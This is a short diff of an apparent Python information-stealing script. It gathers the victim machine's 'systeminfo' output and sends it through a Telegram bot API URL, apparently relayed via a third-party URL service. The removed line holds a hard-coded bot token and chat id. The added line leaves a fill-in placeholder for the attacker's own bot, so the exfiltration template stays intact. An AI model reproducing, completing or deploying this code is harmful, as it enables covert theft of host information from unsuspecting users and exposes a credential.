@@ -102,8 +102,8 @@ informtion= subprocess.getoutput("systeminfo")
 a = (informtion[0:1550])
        
 
-
-url = "https://api.telegram.org/bot6050686473:AAGzqewVzMHZVQ_1y5nIiLxfhzZLaiSOfBE/sendmessage?chat_id=1468157269&text="+str(a+hme)
+#add the bot url
+url = "add the bot url"+str(a+hme)
 
 info = { "UrlBox":url,
       "AgentList":"Mozilla Firefox",
